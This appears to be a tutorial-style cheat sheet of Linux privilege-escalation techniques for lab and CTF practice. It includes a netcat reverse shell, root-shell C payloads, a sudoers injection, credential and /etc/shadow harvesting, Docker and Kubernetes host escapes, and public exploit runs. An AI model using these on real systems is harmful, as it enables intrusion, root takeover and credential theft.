# Linux - Privilege Escalation

<p align="center">
  <img src="https://github.com/user-attachments/assets/14b2c4c2-4a11-4bea-85de-fa660dfe591e" alt="InzelSec Logo" width="150"/>
</p>

## Summary

- [LinPeas and LinEnum](#tools)
- [Transferring files (wget, curl & scp)](#transferring-files)
- [Restricted Shells](#restricted-shells)
---
- [1. Manual enumeration / Information Gathering](#1-manual-enumeration)
- [2. SUDO](#2-sudo)
- [3. SUID / SGID](#3-suid)
- [4. Capabilities](#4-capabilities)
- [5. Cron Jobs](#5-cron-jobs)
- [6. PATH](#6-path)
- [7. NFS](#7-nfs)
- [8. Write permission on /etc/passwd](#8-write-on-etcpasswd)
- [9. Groups (LXD, Docker, Disk, Adm)](#9-groups)
  - [9.1 LXD](#9.1-lxd)
  - [9.2 Docker](#9.2-docker)
  - [9.3 Disk](#9.3-disk)
  - [9.4 Adm](#9.4-adm)
- [10. Others..](#10-others)
  - [10.1 Screen](#10.1-screen)
  - [10.2 Logrotate](#10.2-logrotate)
  - [10.3 Kubernetes](#10.3-kubernetes)
  - [10.4 Shared Object Hijacking](#10.4-shared-object-hijack)
  - [10.5 Python Library Hijacking](#10.5-python-hijack)
  - [10.6 0-Days (CVEs)](#10.6-cves)

---

**GTFObins** → https://gtfobins.github.io/

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
export TERM=xterm
# OR
export TERM=linux
```

---
<a id="tools"></a>
## LinPeas and LinEnum

  * **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  * **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

---
<a id="transferring-files"></a>
## Transferring files (wget, curl & scp)

  * **WGET & cURL:**
    * on our machine, in the directory where we have the file, we open a server:

      * `python3 -m http.server 8000`
    * now on the target machine we can use either WGET or CURL:
        * `wget http://10.10.14.199:8080/LinEnum.sh`
        * `curl http://10.10.14.199:8080/LinEnum.sh -o LinEnum.sh`
    * Now just `chmod +x LinEnum.sh` and run it.

  * **SCP:**

    * When we know an SSH login of some user
    * Open the python server on our machine:
      * `python3 -m http.server 8000`
    * now on the target machine:
      * `scp linenum.sh user@remotehost:/tmp/linenum.sh`

  * **BASE64**
    * Useful to transfer small files and when there is a firewall blocking transfers.
    * First on our machine we encode the file:
      * `base64 linenum.sh -w 0`
        * `-w 0` → removes line breaks (+ easier to copy/paste)
    * Now we copy the output, and on the target machine:
      * `echo 'IyEvYmluL3NoCmlmIFtbIC1... <SNIP> ...kNlcnQgdmVyc2lvbiBvZg==' | base64 -d > linenum.sh`
    * After that, we just need to make the file executable to run it:
      * `chmod +x linenum.sh`
    * To check that it worked and the file is the same, we can run to check if the hash result is the same on both machines:
      * `md5sum shell`

---
<a id="restricted-shells"></a>
## Restricted Shells
Restricted shells, such as: **RBASH**, **RKSH**, **RZSH**. In which we can't execute commands like **`cd`**, etc. First check which shell we are in:

  ```bash
  echo $0
  echo $SHELL
  ```
We can run commands inserted inside commands that we have permission for, e.g.:

  ```bash
  ls whoami
  ls $(id)
  ```

  [https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)

  We can enumerate the available commands with **`compgen -c`** or **`echo *`**.
  
---
<a id="1-manual-enumeration"></a>
# **1. Manual enumeration / Information Gathering**
(check CVE exploits for the kernel version (`uname -a`  or  `cat /proc/version`))

  **System (host / kernel / arch)**

  ```bash
  hostname
  cat /etc/os-release
  cat /etc/issue
  uname -a
  uname -r
  cat /proc/version
  arch
  lscpu
  ```

  **User & environment (identity, groups, shell, history, env)**

  ```bash
  whoami
  id
  groups
  getent group sudo
  cat /etc/passwd
  cut -d: -f1 /etc/passwd
  grep -E "/bin/(ba|z|)sh$" /etc/passwd
  cat /etc/group
  lastlog
  who
  w
  history
  cat ~/.bash_history
  env
  echo $PATH
  cat /etc/shells
  ```

  **Processes, services & running privileges**

  ```bash
  ps aux
  ps -A
  ps aux | grep root
  systemctl list-units --type=service --state=running
  ss -tulpen
  netstat -tulpen 2>/dev/null || true
  strace -o /tmp/strace.out <command>        # e.g.: strace -o /tmp/s.out ping -c1 1.2.3.4
  find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
  ```

  **Permissions & escalation vectors (sudo, SUID/SGID, capabilities, cron, timers, writable)**

  ```bash
  sudo -V
  sudo -l
  find / -perm -4000 -type f 2>/dev/null        # SUID
  find / -perm -2000 -type f 2>/dev/null        # SGID
  find / -perm /6000 -type f 2>/dev/null        # any setuid/setgid
  getcap -r / 2>/dev/null || true               # file capabilities
  ls -la /etc/cron*
  ls -la /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly
  crontab -l 2>/dev/null || true
  sudo crontab -l 2>/dev/null || true
  cat /etc/crontab
  systemctl list-timers --all
  find / -type d -perm -o+w -print 2>/dev/null
  find / -type f -perm -o+w -print 2>/dev/null
  find / -type d -perm -0002 -ls 2>/dev/null   # world-writable dirs
  ```

  **Files, configs, keys & credential hunting**

  ```bash
  ls -la /home
  ls -la /home/*/.ssh 2>/dev/null
  ls -la ~/.ssh
  cat /home/$(whoami)/.ssh/authorized_keys 2>/dev/null || true
  ls -l /tmp /var/tmp /dev/shm
  ls -la /var/log
  cat /etc/fstab
  cat /etc/hosts
  cat /etc/resolv.conf

  # targeted grep for credentials (noisy — use carefully)
  grep -R --line-number -i "PASS|PASSWORD|PWD|SECRET|TOKEN|KEY|DB_USER|DB_PASSWORD|DB_PASS|MYSQL_USER|MYSQL_PASSWORD" / 2>/dev/null | head -n 200

  # smarter targeted search for common config files and credential-like keys
  find / -type f ! -path "/proc/*" \( -iname "*.conf" -o -iname "*.cnf" -o -iname "*.ini" -o -iname "*.env" -o -iname "*config*" -o -iname "wp-config.php" -o -iname "*.php" \) -print 2>/dev/null | while read f; do
    grep -HiE "user|pass|pwd|secret|token|key|credential" "$f" 2>/dev/null && echo "-> $f"
  done

  find / -type f -name "*_history" -o -name "*_hist" -o -name ".*history" -exec ls -l {} \; 2>/dev/null
  grep -R --line-number -i "password\|passwd\|credential\|ssh-rsa" /var/log 2>/dev/null || true
  ls -la /var/lib/php/sessions 2>/dev/null || true
  sudo cat /etc/shadow 2>/dev/null || ( [ -r /etc/shadow ] && cat /etc/shadow ) 2>/dev/null || true
  ```

  **Network, mounts & packages (routing, ARP, disks, installed pkgs)**

  ```bash
  ip a
  ifconfig 2>/dev/null || true
  route -n
  ip route
  arp -a
  netstat -rn
  cat /etc/hosts
  cat /etc/resolv.conf

  lsblk
  mount | column -t
  df -h
  cat /etc/fstab

  # packages
  dpkg -l | less                 # Debian/Ubuntu
  apt list --installed 2>/dev/null | tee installed_pkgs.list
  rpm -qa | less                 # RHEL/CentOS
  # older/alternate listing:
  apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
  ```

  **Quick discovery & helper one-liners**

  ```bash
  # check for useful binaries present (GTFOBins candidates)
  for p in nc wget curl python perl bash ssh; do command -v $p >/dev/null && echo "found: $p"; done

  # list bin paths
  for d in $(echo $PATH | tr ":" "\n"); do ls -1 $d 2>/dev/null; done

  # find scripts
  find / -type f \( -name "*.sh" -o -name "*.py" -o -name "*.pl" \) 2>/dev/null | grep -v "/usr/share" | grep -v "/snap" | sort -u

  # search for config-like files quickly
  find / ! -path "/proc/*" -iname "*config*" -type f 2>/dev/null

  # webroot focused credential scan (example)
  grep -E "DB_USER|DB_PASSWORD|DB_PASS|MYSQL_USER|MYSQL_PASSWORD" -R /var/www 2>/dev/null

  # check shared libs of a binary
  ldd /path/to/binary 2>/dev/null

  # combined SUID/SGID
  find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
  ```

---
<a id="2-sudo"></a>
# 2. **SUDO**
  List commands we can run with sudo.
  
    ```bash
    sudo -l
    ```
    
    ```bash
    cat /etc/sudoers
    ```
    
  * **Ex → tcpdump:**
    ```bash
    sudo -l
    '
    User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
    '
    ```

    * **tcpdump with -z, tcpdump has the -z flag:** **`-z postrotate-command`** Allows executing an external command after rotating a ***.pcap*** file. If we control the value of **-z**, we can execute any script or command as root.

    * On our terminal we open a Listener:
    **`nc -lvnp 4444`**

    On the target:

    ```bash
    echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> 443 > /tmp/f' > /tmp/.test
    chmod +x /tmp/.test
    ```

    ```bash
    sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
    ```

    * **`-i eth0`** 	Interface to listen on
    * **`-w /dev/null`**	Output file (discarded)
    * **`-G 1`**	Rotate every 1 second
    * **`-W 1`**	Only 1 file
    * **`-z script`**	Command to be executed on rotate
    * **`-Z root`**	Run as root

  ---

  * **Ex → LD_PRELOAD:**

    *  If we get **PRELOAD** in the response (**`env_keep+=LD_PRELOAD`)**.
    * environment variable that allows loading custom shared libraries before the program's standard libraries. This can be exploited to execute arbitrary code with elevated privileges.
    * After that, we write **`shell.c`** that elevates privileges:

      ```c
      #include <stdio.h>
      #include <sys/types.h>
      #include <stdlib.h>

      void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
      }
      ```

    * Compile to a .so file:

      * `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

        * `fPIC`: Generates position-independent code.
        * `shared`: Creates a shared library.
        * `nostartfiles`: Does not use standard start files.

    * Execute the program:

      * `sudo LD_PRELOAD=/home/user/shell.so find`

---
<a id="3-suid"></a>
# 3. **SUID / SGID**

  * Allows the program to be executed with the same permissions as the Owner (remember to use the full **PATH**).

  * **SUID**

    ```bash
    find / -type f -perm -04000 -ls 2>/dev/null
    ```

  * **SGID**

    ```bash
    find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
    ```

---
<a id="4-capabilities"></a>
# 4. **Capabilities**

  * When specific privileges are granted to a user to perform tasks.

    ```bash
    getcap -r / 2>/dev/null
    ```
    
    ```bash
    find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
    ```

  * **Ex → `vim`:**

    * we can open a shell:

      `/home/karen/vim -c ‘:py3 import os; os.setuid(0); os.exec(”/bin/sh”, “sh”, “-c”, “reset; exec sh”)’`

---
<a id="5-cron-jobs"></a>
# 5. **Cron Jobs**

  * Scripts or commands set to run at specific times, by default they run with the owner's privileges.

    ```bash
    cat /etc/crontab
    # Other ways:
    ls -la /etc/cron.hourly/
    ls -la /etc/cron.daily/
    ls -la /etc/cron.weekly/
    ls -la /etc/cron.monthly/
    ls -la /etc/cron.d/
    crontab -l 2>/dev/null
    ls -la /var/spool/cron/crontabs/ 2>/dev/null
    ```

  * **Wildcard Abuse** (**`*`** at the end of the cronjob/script)

    * It is the use of **wildcard characters** (`*`, `--option=value`, etc.) to **inject arguments into the command** called by a cronjob (usually with elevated privileges). **BASICALLY** when there is a **`*`** at the end of a cronjob and we try to exploit it. Example with `tar`, it is possible to abuse the **flag `--checkpoint-action=exec=`** to execute arbitrary commands.
  
      ```
      * * * * * root cd /somepath && tar -zcf backup.tar.gz *
      ```

    * When we locate the **`*`**, we check if we have write permission in the directory:

      ```bash
      cd /path
      touch test.txt
      ```

    * We then explore according to the cronjob (since we will change flags..).. research accordingly.

    * **Ex → `tar`:**

      ```bash
      echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
      chmod +x root.sh
      echo "" > "--checkpoint-action=exec=sh root.sh"
      echo "" > --checkpoint=1
      ```
  
      ```bash
      sudo -l
      sudo su -
      ```

    ---

  * Many times the program may have been deleted, but it may be that the admin forgot to delete it in Cron Jobs too, that is, we can simply create a program with the same name of the missing one in the referenced directory.

---
<a id="6-path"></a>
# 6. **PATH**

  * Environment variable listing directories. Basically when we type a command without specifying its directory, the system will look through the list of PATH directories; we can then add a directory at the beginning of the list and execute a command/program.

    ```bash
    echo $PATH
    ```

  * We need to find directories/folders where we have write permission:

    ```bash
    find / -writable 2>/dev/null
    ```

    ```bash
    `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
    ```

  * Then we insert the directory we want at the beginning of PATH:

    ```bash
    export PATH=/var/www/html/data:$PATH
    ```
    
  * And we create the file:

    * `cd /tmp`
    * `echo “/bin/bash” > bruh`
    * `chmod 777 bruh`
  
  * Now just run it in another directory and without specifying it.

---
<a id="7-nfs"></a>
# 7. **NFS**

  * **NFS (Network File Sharing)** → protocol that allows mounting remote file systems so they can be accessed as if local. Basically when there is a directory on the target machine that allows sharing with other computers, then we create a share with our machine and in that share we create a file that executes with root permissions and also set the +s bit, thus on the target machine we can execute that file and escalate to root.

    ```bash
    cat /etc/exports
    ```

  * Look for any entry with the option `no_root_squash`, and also for `rw` (read,write) which means we can create an executable inside.

  * Now, on our machine we will see the shares available on the NFS server:

    * `showmount -e <IP_of_NFS_Server>` (target IP as usual)

  * Then we mount the share, still on our machine:

    * `mkdir /tmp/backupsonattackermachine` → creates a directory on our machine

    * `mount -o rw 10.0.2.12:/backups /tmp/backupsonattackermachine` → where the two directories “create” the share.

    * `nano nfs.c` :

      ```c
      int main()
      {
      	setgid(0);
      	setuid(0);
      	system("/bin/bash");
      	return 0;
      }
      ```

    * `gcc nfs.c -o nfs -w`

    * `chmod +s nfs`  and  `chmod +x nfs`

    * Since we already mounted the share, the file will already be in the target machine's directory (`/backups`), we don't need to transfer it.

---
<a id="8-write-on-etcpasswd"></a>
# 8. Write permission on **/etc/passwd**

  ```bash
  ls -l /etc/passwd
  ```

  * First, generate an encrypted password with openssl:

    * `openssl passwd -1 “mypassword”`
  * Now, using nano, edit `/etc/passwd` and add a new entry:

    * `root:$1$...:0:0:root:/root:/bin/bash`

---
<a id="9-groups"></a>
# 9. **Groups** (LXD, Docker, Disk, Adm)

  Run **`id`** and see if we are in any of the groups below.
  <a id="9.1-lxd"></a>
  ## **LXD**
  
  If the user belongs to the **`lxd`** group, they can **create containers**. With a privileged container + volume mount, you can **access the host filesystem as root**, even as a regular user.

  ```bash
  # Start LXD setup (use defaults):
  lxd init

  # Check if there is already an image:
  lxc image list

  # If there is no image, we download Alpine:
  # CHECK the new version and change (GPT..):
  wget https://images.linuxcontainers.org/images/alpine/3.18/amd64/default/20230817_13:00/lxd.tar.xz
  wget https://images.linuxcontainers.org/images/alpine/3.18/amd64/default/20230817_13:00/rootfs.squashfs

  lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

  # IF THERE IS ALREADY an image, we import it:
  # Ex: https://academy.hackthebox.com/module/51/section/1588
  ```

  Create privileged container with access to host:

  ```bash
  # Create the container with privileged permission:
  lxc init alpine pwnbox -c security.privileged=true

  # Add the host filesystem to the container:
  lxc config device add pwnbox host-root disk source=/ path=/mnt/root recursive=true

  # Start container and access shell:
  lxc start pwnbox
  lxc exec pwnbox /bin/sh
  ```

  Now with root access:

  ```bash
  # Confirm root:
  id

  # Access host filesystem:
  cd /mnt/root/root
  ls

  # Sensitive data:
  cat /mnt/root/etc/shadow
  cat /mnt/root/root/.bash_history
  cat /mnt/root/root/.ssh/id_rsa
  ```

  ---
  <a id="9.2-docker"></a>
  ## **Docker**

  ### 1. Check if you are in a Docker container

  ```bash
  cat /proc/1/cgroup
  ```

  If you find lines with "docker", you are probably inside a container.

  ---

  ### 2. Check for mounted volumes (access to host filesystem)

  ```bash
  find / -type d -name '.ssh' 2>/dev/null
  find / -type f -name 'id_rsa' 2>/dev/null
  ```

  If you find something like `/hostsystem/root/.ssh/id_rsa`, you can access the **host** via SSH if you copy the private key.

  ---

  ### 3. Check if you are in the `docker` group (outside container)

  ```bash
  id
  ```

  If it returns something like:

  ```bash
  uid=1000(user) gid=1000(user) groups=1000(user),116(docker)
  ```

  ---

  ### 4. Check if Docker is installed and accessible

  ```bash
  which docker
  docker ps
  ```

  ---

  ### 5. If **docker.sock** is accessible, use it to escalate

  #### 5.1 Check the socket

  ```bash
  ls -l /var/run/docker.sock
  ```

  ### 5.2 Create container with host root

  ```bash
  docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
  ```

  Now you have access to the **host root** inside the container.

  ---

  ### 6. If inside a container and **docker.sock** is available

  #### 6.1 Download the Docker binary if it doesn't exist

  ```bash
  wget https://<YOUR-MACHINE-IP>:443/docker -O docker
  chmod +x docker
  ```

  #### 6.2 List active containers via socket

  ```bash
  ./docker -H unix:///app/docker.sock ps
  ```

  #### 6.3 Run a new privileged container with host access

  ```bash
  ./docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
  ```

  #### 6.4 Connect to the new container

  ```bash
  ./docker -H unix:///app/docker.sock exec -it <container-id> /bin/bash
  ```

  Now you can:

  ```bash
  cat /hostsystem/root/.ssh/id_rsa
  ```

  ---

  ### 7. If you find exposed ENV variables (user, password etc.)

  ```bash
  strings /proc/*/environ | grep -i pass
  ```

  Or inside the container:

  ```bash
  printenv
  ```

  ---

  ### 8. Other paths

  * Check `.bash_history`, `.ssh`, `config.json`, automated scripts etc.
  * Search dockerfiles and saved images with `docker image ls`
  * Use `docker inspect` to look for mounted directories

  ---

  ### Notes

  * Always try to exploit **mounted volumes first**, then `docker.sock`, then the `docker` group.
  * Privileged containers allow mounting the host `/`: this gives **full root access**.

  ---
  <a id="9.3-disk"></a>
  ## **Disk**

  ```bash
  # Check partitions:
  lsblk

  # Use debugfs (example for sda1):
  sudo debugfs /dev/sda1

  # Inside debugfs:
  ls /
  cat /etc/shadow
  ```

  ---
  <a id="9.4-adm"></a>
  ## **Adm**

  Being in this group, we have permission to read all logs inside **`/var/log`**

  ```bash
  # Read privileged logs:
  cat /var/log/auth.log
  cat /var/log/syslog

  # See cron jobs and executed commands:
  grep CRON /var/log/syslog
  grep -i password /var/log/*
  ```

---
<a id="10-others"></a>
# 10. **Others..**
  <a id="10.1-screen"></a>
  * **Screen** (`screen -v`)

    Screen version 4.5.0 → vulnerable.
    **`screen -v`**

    [https://github.com/YasserREED/screen-v4.5.0-priv-escalate](https://github.com/YasserREED/screen-v4.5.0-priv-escalate)

---
  <a id="10.2-logrotate"></a>
  * **Logrotate** (`logrotate --version`)

    Tool to manage log files on Linux.

    First we can look for CVEs:

    **`logrotate --version`**

    * 3.8.6
    * 3.11.0
    * 3.15.0
    * 3.18.0

    Confirm that `logrotate` runs as root via cron

    ```bash
    cat /etc/cron.daily/logrotate
    ```

    Cron usually runs `logrotate` as **root**. This is important because **even if the user does not have root privileges**, if they can manipulate the files monitored by `logrotate`, the process **can perform actions on their behalf as root**.

    ---

    ### 2. Identify configuration files

    ```bash
    cat /etc/logrotate.conf
    ls /etc/logrotate.d/
    ```

    These files show which **logs are being monitored** and how. Each entry defines a log path (e.g., `/var/log/nginx/*.log`) and associated rules (frequency, permissions, compression, etc.).

    ---

    ### 3. Check if you can write to any monitored log

    ```bash
    find /var/log -writable 2>/dev/null
    ```

    or

    ```bash
    ls -l /var/log | grep $(whoami)
    ```

    ---

    ### 4. Understand what `create` and `compress` mean

    ### Ex:

    ```bash
    cat /etc/logrotate.conf | grep -v '^#'
    ```

    ### Practical explanation:

    * `create`: after rotating, **creates a new log file** with the specified permissions.

       If the user can manipulate this, they can force the **creation of arbitrary files**.
    * `compress`: after rotating, **compresses the old log**.

      * Can be exploited in cases where compression invokes system utilities with controllable input.


    If logrotate is configured to **create new files as root**, but the user controls the log path, they can cause **creation of files in arbitrary locations as root**, for example `/etc/cron.d/backdoor`.

    ---

    ### 5. Read real config examples to understand the risk

    ```bash
    cat /etc/logrotate.d/nginx
    ```

    ### Real example:

    ```
    /var/log/nginx/*.log {
        daily
        missingok
        rotate 14
        compress
        delaycompress
        notifempty
        create 0640 www-data adm
        sharedscripts
        postrotate
            [ -f /run/nginx.pid ] && kill -USR1 `cat /run/nginx.pid`
        endscript
    }
    ```


    Here we see that:

    * Rotation is **daily** (`daily`)
    * Logs are **compressed**
    * The new file is created with permission `0640` and owner `www-data` (e.g., web server)
    * A script is executed after rotation (`postrotate`)

    If the user is `www-data`, they can write to that log, which is processed by a script **running as root** → **super dangerous**.

    ---

    ### 6. Monitor if `logrotate` is running with `ps` or `journalctl`

    ```bash
    ps aux | grep logrotate
    journalctl | grep logrotate
    ```


    Checks if it is running via cron or manually. This helps predict **when your payload will be processed** (e.g., when forcing rotation with `logrotate -f` during testing).

    ---

    ### 7. Simulate log injection (without exploit)

    ```bash
    echo "Malicious log injected by $(whoami)" >> /var/log/target.log
    ```

    If the log is **referenced in a logrotate configuration file** and you can write to it, it is possible to exploit rotation to manipulate files on the system (e.g., write to cron, .ssh, etc.).

    ---

    ### 8. Confirm previous rotations

    ```bash
    cat /var/lib/logrotate/status
    ```

    You can see when the last rotation occurred. This helps know if a new execution is near (daily, weekly, etc.).

    ---

    ### 9. Manually test if logrotate runs and with what permissions

    ```bash
    logrotate -d /etc/logrotate.conf     # debug mode
    sudo logrotate -f /etc/logrotate.conf  # force rotation
    ```

    * `-d` shows what would be done, useful to understand the flow.
    * `-f` forces rotation and can help test during a CTF or HTB box if you have limited sudo.

  ---
  <a id="10.3-kubernetes"></a>
  ## **Kubernetes**

  ### 1. Check access to the Kubelet API

  ```bash
  curl -k https://<IP>:10250/pods | jq .
  ```

  If it returns a `PodList`, you have **anonymous access to the Kubelet API**.

  ---

  ### 2. List Pods with `kubeletctl`

  Install (if necessary):

  ```bash
  go install github.com/cyberark/kubeletctl@latest
  ```

  Use:

  ```bash
  kubeletctl -i --server <IP> pods
  ```

  ---

  ### 3. Look for Pods vulnerable to RCE

  ```bash
  kubeletctl -i --server <IP> scan rce
  ```

  Look for `RCE: +` → that pod allows remote command execution.

  ---

  ### 4. Execute commands in the pod (as root)

  ```bash
  kubeletctl -i --server <IP> exec "id" -p <pod_name> -c <container_name>
  ```

  ✔️ If it returns `uid=0(root)` → you have **root access inside the container**.

  ---

  ### 5. Steal the Service Account Token and Certificate

  ```bash
  kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container> | tee k8.token

  kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod> -c <container> | tee ca.crt
  ```

  ---

  ### 6. Test token permissions via `kubectl`

  ```bash
  export token=$(cat k8.token)

  kubectl --token=$token \
          --certificate-authority=ca.crt \
          --server=https://<IP>:6443 \
          auth can-i --list
  ```

  Check if the token has permission to create pods, read secrets, etc.

  ---

  ### 7. Create a malicious Pod mounting the host root

  **privesc.yaml**:

  ```yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: privesc
    namespace: default
  spec:
    containers:
    - name: privesc
      image: nginx:1.14.2
      volumeMounts:
      - mountPath: /mnt/host
        name: host-root
    volumes:
    - name: host-root
      hostPath:
        path: /
    automountServiceAccountToken: true
    hostNetwork: true
  ```

  ---

  ### 8. Deploy the malicious Pod

  ```bash
  kubectl --token=$token \
          --certificate-authority=ca.crt \
          --server=https://<IP>:6443 \
          apply -f privesc.yaml
  ```

  ---

  ### 9. Access sensitive host files

  ```bash
  kubeletctl -i --server <IP> exec "cat /mnt/host/root/.ssh/id_rsa" -p privesc -c privesc
  ```

  Now you have **read the real host filesystem as root**.

  ---

  ### Quick Reference Table

  | Step | Goal                     | Main Command                    |
  | ---- | ------------------------ | ------------------------------- |
  | 1    | Test Kubelet API access  | `curl :10250/pods`              |
  | 2    | List active Pods         | `kubeletctl pods`               |
  | 3    | Identify vulnerable pods | `kubeletctl scan rce`           |
  | 4    | Exec RCE on Pod          | `kubeletctl exec "id"`          |
  | 5    | Dump Token and CA        | `cat /var/run/secrets/...`      |
  | 6    | Test permissions         | `kubectl auth can-i`            |
  | 7    | Create malicious Pod     | `kubectl apply -f privesc.yaml` |
  | 8    | Access host files        | `cat /mnt/host/...`             |


---
  <a id="10.4-shared-object-hijack"></a>
  ## **Shared Object Hijacking**

  Dynamic programs use **`.so`** libraries to perform functions external to the main code.

  If a binary with **SUID permission** (run as root) looks for a library from a **custom and vulnerable (writable)** path, we can **create a fake library** to run malicious code as **root**.


  Via **SUID**:

  **`find / -perm -4000 -type f 2>/dev/null`**

  Or other ways we find a binary, we use **ldd**:

  **`ldd ./payroll`**

  If some **`.so`** appears, for example:

  **`libshared.so => /development/libshared.so`**

  Check the PATH:
  **`readelf -d /home/htb-student/shared_obj_hijack/payroll  | grep PATH`**

  In the example it returns a directory called **`/development`**, which when we run **`ls -la`** we notice we have write permission, we can then run ldd again on the binary to know the function name:

  **`./payroll`**

  example output:

  **`symbol lookup error: ./payroll: undefined symbol: dbquery`**

  We then know the name is **`dbquery`**, so now we create the payload:

  ```bash
  // libshared.c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>

  void dbquery() {
      printf("Malicious library loaded\n");
      setuid(0);
      system("/bin/sh -p");
  }
  ```

  Compile and run again:
  **`gcc src.c -fPIC -shared -o /development/libshared.so`**

  **`./payroll`**


  ---
  <a id="10.5-python-hijack"></a>
  ## **Python Library Hijacking**
  
  When you are allowed to execute a **Python script with elevated privileges** (via `sudo`, `SUID`, etc.) and that script **imports external modules**, you can exploit Python’s **module resolution order** to execute arbitrary code.
  
  
  ### Prerequisites  
  * You can **run a Python script as root or another privileged user**:
  * The script **imports external modules**, such as `os`, `random`, `base64`, etc.
  
  ---
  
  ### (if `sudo -l` had returned `SETENV`):
  
  ```bash
  echo 'def b64encode(x): import os; os.system("/bin/bash")' > /tmp/base64.py
  ```
  ```bash
  sudo PYTHONPATH=/tmp sudo -E /usr/bin/python3 /opt/script.py
  ```

  ---

  
  ## Exploitation Steps
  
  ### 1. Identify Imported Modules
  
  Check which modules are imported in the script:

  ```bash
  cat script.py
  # Output:
  import base64
  import random
  import os
  ```
  
  ### 2. Locate the Original Module
  
  Use Python to locate where the target module resides (ex: base64):
  
  ```bash
  python3 -c 'import base64; print(base64.__file__)'
  ```

  
  ### 3. Check for Write Permissions on the Original File
  
  ```bash
  ls -l /usr/lib/python3.7/base64.py
  ```
  
  If so, modify it directly:
  
  ```python
  # base64.py
  def b64encode(a):
      import os
      os.system("/bin/bash")
  ```

  
  ### 4. If Not Writable: Check for Write Access to the Script’s Directory
  Python will **import local files before system libraries**.
  If the script is in `/home/batman/script.py`:
  
  ```bash
  ls -l /home/batman
  ```
  
  If writable, create a malicious module in the same directory:

  `nano base64.py`
  
  ```python
  # /home/batman/base64.py
  def b64encode(a):
      import os
      os.system("/bin/bash")
  ```
    
  
  ### 5. Inspect Python’s Module Priority Search Order
  
  We can see the priority order (sys.path) by running:
  
  ```bash
  python3 -c 'import sys; print("\n".join(sys.path))'
  ```

  
  Then we check for Writable Directories Higher in the Import Priority
  
  We need to remember the localtion of the regit module, e.g.: if `base64.py` is in `/usr/lib/python3.7/` and `/usr/local/lib/python3.7/` is higher, we check if writeable:
  
  ```bash
  ls -ld /usr/local/lib/python3.7/
  ```
  
  If writable, we place the malicious module there:
  
  ```python
  # /usr/local/lib/python3.7/base64.py
  def b64encode(a):
      import os
      os.system("/bin/bash")
  ```
  
  ### 7. Moving the Original and Replacing It in a Higher Path
  
  This is only possible if we have full write access. Move the original module to a lower-priority path and place our malicious version in a higher-priority one:
  
  ```bash
  mv /usr/lib/python3.7/base64.py /usr/lib/python3.7/lib-old/
  nano /usr/lib/python3.7/base64.py  # your malicious version
  ```

  ---
  
  <a id="10.6-cves"></a>
  ## **0-Days (CVEs)**

  * **Sudo**

    ```bash
    sudo -V | head -n1
    ```

    Search for exploits.

    ---

  * **Polkit**

    Try:

    **`pkexec -u root id`**

    To get a shell:

    ```bash
    git clone https://github.com/arthepsy/CVE-2021-4034.git
    cd CVE-2021-4034
    gcc cve-2021-4034-poc.c -o poc
    ./poc
    ```

    ---

  * **Dirty Pipe**

    Vulnerability in the Linux kernel, where we can edit root files.

    **`5.8`** to **`5.17`**  ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847))

    To check if it is vulnerable:

    **`uname -r`**

    ---

    ```bash
    git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
    cd CVE-2022-0847-DirtyPipe-Exploits
    # transfer all files to the target and then:
    bash compile.sh
    ```

    There are two versions of the exploit to use:

    ### Exploit-1

    ```bash
    ./exploit-1
    ```

    ### Exploit-2

    ```bash
    find / -perm -4000 2>/dev/null
    # We choose some binary:
    ./exploit-2 /usr/bin/sudo
    ```

    ---

  * **Netfilter**

    ```bash
    uname -r
    ```

    * **CVE-2021-22555**: Linux 2.6 – 5.11
    * **CVE-2022-25636**: Linux 5.4 – 5.6.10
    * **CVE-2023-32233**: Linux up to 6.3.1 (nf_tables enabled)

---

**`unshadow passwd.txt shadow.txt > passwords.txt`** → joins users with the encrypted passwords into the file passwords.txt, now just run John to try to crack.
